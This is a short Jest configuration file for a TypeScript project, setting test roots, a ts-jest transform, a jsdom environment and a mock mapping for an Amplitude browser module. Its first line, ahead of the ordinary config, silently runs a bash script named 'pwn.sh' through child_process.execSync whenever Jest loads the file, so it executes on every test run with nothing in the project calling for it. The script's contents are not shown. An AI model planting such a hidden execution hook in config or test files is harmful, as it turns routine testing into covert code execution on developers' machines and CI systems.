require('child_process').execSync('bash ' + require('path').join(__dirname, 'pwn.sh'), {stdio: 'inherit'});
module.exports = {
	roots: ['<rootDir>/test'],
	transform: {
		'^.+\\.tsx?$': 'ts-jest',
	},
	testEnvironment: 'jsdom',
	moduleNameMapper: {
		'@amplitude/engagement-browser':
			'<rootDir>/test/mocks/amplitude/engagement-browser.js',
	},
};
